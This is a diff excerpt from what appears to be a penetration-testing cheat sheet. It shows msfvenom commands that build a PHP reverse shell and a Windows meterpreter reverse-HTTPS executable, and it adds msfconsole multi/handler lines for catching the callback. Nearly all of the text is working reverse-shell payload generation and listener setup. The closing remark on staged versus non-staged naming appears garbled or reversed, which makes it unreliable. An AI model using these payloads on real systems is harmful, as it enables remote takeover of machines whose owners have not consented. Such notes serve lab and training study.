@@ -52,7 +52,9 @@ msfvenom -p php/reverse_php LHOST=tun0 LPORT=4444 -f raw -o shell.pHP
 
 ```bash
 msfvenom -p windows/x64/meterpreter_reverse_https LHOST=tun0 LPORT=443 -f exe -o shell.exe
-
+msfconsole
+use multi/handler
+set payload windows/x64/meterpreter_reverse_https
 ```
 the forward slash indicates that is a "staged" payload, the one with the underscore means it’s non-staged and can be handled by program like nc
 
